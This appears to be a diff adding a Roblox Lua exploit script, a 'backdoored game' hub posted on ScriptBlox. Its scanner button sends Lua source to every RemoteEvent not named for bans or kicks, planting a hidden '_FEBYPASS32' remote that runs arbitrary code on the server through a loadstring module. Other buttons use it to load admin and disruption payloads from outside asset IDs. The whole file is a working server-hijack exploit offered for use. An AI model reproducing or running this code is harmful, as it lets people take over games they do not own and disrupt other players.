@@ -1,0 +1,551 @@
+--[[
+	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
+]]
+--v4.0.0
+
+---by gojohdkaisenkt---
+---by gojohdkaisenkt---
+---by gojohdkaisenkt---
+---by gojohdkaisenkt---
+---by gojohdkaisenkt---
+---by gojohdkaisenkt---
+---start---------------
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+-- https://scriptblox.com/script/Universal-Script-new-backdoored-hub-v2-38350
+
+---by gojohdkaisenkt---
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+local SS = Instance.new("ScreenGui")
+local Main = Instance.new("Frame")
+local Execute = Instance.new("TextButton")
+local Clear = Instance.new("TextButton")
+local Script = Instance.new("TextBox")
+local Check = Instance.new("TextButton")
+local minosprime = Instance.new("TextButton")
+local minosprime2 = Instance.new("TextButton")
+local minosprime3 = Instance.new("TextButton")
+local minosprime4 = Instance.new("TextButton")
+local idk = Instance.new("TextLabel")
+--Properties:
+SS.Name = "SS"
+SS.Parent = game.CoreGui
+SS.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+SS.ResetOnSpawn = false
+ 
+Main.Name = "Main"
+Main.Parent = SS
+Main.Active = true
+Main.BackgroundColor3 = Color3.new(253,100,50)
+Main.BorderColor3 = Color3.new(255,255,255)
+Main.Position = UDim2.new(0.377503842, 0, 0.37714988, 0)
+Main.Size = UDim2.new(0, 317, 0, 200)
+Main.Draggable = true
+ 
+Execute.Name = "Execute"
+Execute.Parent = Main
+Execute.BackgroundColor3 = Color3.new(253,100,50)
+Execute.BorderColor3 = Color3.new(253,100,50)
+Execute.Position = UDim2.new(0.0220820196, 0, 0.77142489, 0)
+Execute.Size = UDim2.new(0, 147, 0, 44)
+Execute.AutoButtonColor = false
+Execute.Font = Enum.Font.LuckiestGuy
+Execute.Text = "Execute"
+Execute.TextColor3 = Color3.new(0, 0, 0)
+Execute.TextScaled = true
+Execute.TextSize = 14
+Execute.TextWrapped = true
+ 
+Clear.Name = "Clear"
+Clear.Parent = Main
+Clear.BackgroundColor3 = Color3.new(253,100,50)
+Clear.BorderColor3 = Color3.new(253,100,50)
+Clear.Position = UDim2.new(0.513000011, 0, 0.770999968, 0)
+Clear.Size = UDim2.new(0, 147, 0, 44)
+Clear.Font = Enum.Font.LuckiestGuy
+Clear.Text = "Clear"
+Clear.TextColor3 = Color3.new(0, 0, 0)
+Clear.TextScaled = true
+Clear.TextSize = 14
+Clear.TextWrapped = true
+ 
+Script.Name = "Script"
+Script.Parent = Main
+Script.BackgroundColor3 = Color3.new(0.741176, 0.180392, 0.619608)
+Script.BorderColor3 = Color3.new(0.741176, 0.180392, 0.619608)
+Script.Position = UDim2.new(0, 0, 0.125, 0)
+Script.Size = UDim2.new(0, 316, 0, 124)
+Script.Font = Enum.Font.LuckiestGuy
+Script.PlaceholderText = "script by gojohdkaisenkt,note hub version is v4.0.0, scanner for use hub"
+Script.Text = "hi "..game.Players.LocalPlayer.Name.." thank for use my script 🥰"
+Script.TextColor3 = Color3.new(0, 0, 0)
+Script.TextSize = 25
+Script.TextWrapped = true
+Script.TextXAlignment = Enum.TextXAlignment.Left
+Script.TextYAlignment = Enum.TextYAlignment.Top
+ 
+Check.Name = "Check"
+Check.Parent = Main
+Check.BackgroundColor3 = Color3.new(0.741176, 0.180392, 0.619608)
+Check.BorderColor3 = Color3.new(1, 0, 0)
+Check.Position = UDim2.new(-0.26302531, -2, 0, 0)
+Check.Size = UDim2.new(0, 82, 0, 198)
+Check.Font = Enum.Font.LuckiestGuy
+Check.Text = "scanner"
+Check.TextColor3 = Color3.new(1, 1, 1)
+Check.TextScaled = true
+Check.TextSize = 14
+Check.TextWrapped = true
+
+idk.Name = "idk"
+idk.Parent = Main
+idk.BackgroundColor3 = Color3.new(0.741176, 0.180392, 0.619608)
+idk.BorderColor3 = Color3.new(1, 0, 0)
+idk.Position = UDim2.new(-0.26302531, 500, 0, 0)
+idk.Size = UDim2.new(0, 164, 0, 198)
+idk.Font = Enum.Font.LuckiestGuy
+idk.Text = "hey "..game.Players.LocalPlayer.Name.." pls follow me in roblox for more, v4.0.1 new update: koop gui be a cool hacker 😎🗿"
+idk.TextColor3 = Color3.new(1, 1, 1)
+idk.TextScaled = true
+idk.TextSize = 14
+idk.TextWrapped = true
+
+minosprime.Name = "minosprime"
+minosprime.Parent = Main
+minosprime.BackgroundColor3 = Color3.new(0.741176, 0.180392, 0.619608)
+minosprime.BorderColor3 = Color3.new(1, 0, 0)
+minosprime.Position = UDim2.new(-0.26302531, -100, 0, 0)
+minosprime.Size = UDim2.new(0, 82, 0, 198)
+minosprime.Font = Enum.Font.LuckiestGuy
+minosprime.Text = "</> only backdoored game"
+minosprime.TextColor3 = Color3.new(1, 1, 1)
+minosprime.TextScaled = true
+minosprime.TextSize = 14
+minosprime.TextWrapped = true
+
+minosprime2.Name = "minosprime2"
+minosprime2.Parent = Main
+minosprime2.BackgroundColor3 = Color3.new(0.741176, 0.180392, 0.619608)
+minosprime2.BorderColor3 = Color3.new(1, 0, 0)
+minosprime2.Position = UDim2.new(-0.26302531, -200, 0, 0)
+minosprime2.Size = UDim2.new(0, 82, 0, 198)
+minosprime2.Font = Enum.Font.LuckiestGuy
+minosprime2.Text = "admin only backdoored game"
+minosprime2.TextColor3 = Color3.new(1, 1, 1)
+minosprime2.TextScaled = true
+minosprime2.TextSize = 14
+minosprime2.TextWrapped = true
+
+minosprime3.Name = "minosprime3"
+minosprime3.Parent = Main
+minosprime3.BackgroundColor3 = Color3.new(0.741176, 0.180392, 0.619608)
+minosprime3.BorderColor3 = Color3.new(1, 0, 0)
+minosprime3.Position = UDim2.new(-0.26302531, 400, 0, 0)
+minosprime3.Size = UDim2.new(0, 82, 0, 198)
+minosprime3.Font = Enum.Font.LuckiestGuy
+minosprime3.Text = "anti skids v14.1.1 only backdoored game"
+minosprime3.TextColor3 = Color3.new(1, 1, 1)
+minosprime3.TextScaled = true
+minosprime3.TextSize = 14
+minosprime3.TextWrapped = true
+
+minosprime4.Name = "minosprime4"
+minosprime4.Parent = Main
+minosprime4.BackgroundColor3 = Color3.new(0.741176, 0.180392, 0.619608)
+minosprime4.BorderColor3 = Color3.new(1, 0, 0)
+minosprime4.Position = UDim2.new(-0.26302531, -300, 0, 0)
+minosprime4.Size = UDim2.new(0, 82, 0, 198)
+minosprime4.Font = Enum.Font.LuckiestGuy
+minosprime4.Text = "koop gui only backdoored game"
+minosprime4.TextColor3 = Color3.new(1, 1, 1)
+minosprime4.TextScaled = true
+minosprime4.TextSize = 14
+minosprime4.TextWrapped = true
+
+-- Scripts:
+function execute(s)
+	if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+		local Execute=game:GetService("JointsService"):FindFirstChild("_FEBYPASS32"):FireServer(tostring(s)) -- execute
+	else
+		warn("Failed to loadstring: Error 404")
+	end
+end
+Execute.MouseButton1Click:connect(function()
+    game.ReplicatedStorage.RemoteEvent:FireServer(Script.Text)
+end)
+ 
+Clear.MouseButton1Click:connect(function()
+    Script.Text = "clear Success"
+wait(0.5)
+    Script.Text = ""
+end)
+ 
+Check.MouseButton1Click:connect(function()
+Check.Text = "scanning."
+wait(0.01)
+Check.Text = "scanning.."
+wait(0.01)
+Check.Text = "scanning..."
+wait(0.01)
+Check.Text = "not found🔴:("
+wait (0.0000001)
+ local function b_G_V12(see)
+		local a = function(ree)
+			ree:FireServer([[
+                    local folder = Instance.new('RemoteEvent')
+                    folder.Name = "_FEBYPASS32"
+                    folder.Parent = game:GetService("JointsService")
+                    local loadstring = require(13684410229)
+                    folder.OnServerEvent:Connect(function(_1,_2)
+                       loadstring(_2)()
+                    end)
+                    ]]
+			)
+		end
+		for i, v in pairs(see:GetChildren()) do
+			--[[3 lines]]
+			if v:IsA("RemoteEvent") then
+				if not string.match(string.lower(v.Name), "ban") then
+					if not string.match(string.lower(v.Name), "kick") then
+						a(v)
+					end
+				end
+			end
+			--[[-3 lines]]
+			b_G_V12(v) --[[test]]
+		end
+	end
+	local Inject = b_G_V12(game:GetService("ReplicatedStorage"))
+	local timetoken = 0
+	local maxtime = 5
+	repeat wait(0.1) timetoken += 0.1 until game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") or timetoken >= maxtime
+	if game:GetService("JointsService"):FindFirstChild("_FEBYPASS32") then
+		Check.Text = "found ✔️🔵:)"
+      wait(3)
+local message = Instance.new("Hint")
+message.Parent = game.Workspace
+message.Text = "script created by gojohdkaisenkt|free+fast in script blox"
+
+task.wait(30)
+ 
+message:Destroy()
+
+Check.Text = "Try scanner"
+	end
+end)
+minosprime.MouseButton1Click:Connect(function()
+	execute("require(123255432303221):Pload('"..game.Players.LocalPlayer.Name.."')")
+end)
+minosprime2.MouseButton1Click:Connect(function()
+	execute("require(7192763922).load('"..game.Players.LocalPlayer.Name.."')")
+end)
+minosprime3.MouseButton1Click:Connect(function()
+	execute("require(10304477576).AntiSkid('"..game.Players.LocalPlayer.Name.."')")
+end)
+minosprime4.MouseButton1Click:Connect(function()
+	execute("require(14829670677).EDITL0L('"..game.Players.LocalPlayer.Name.."')")
+end)
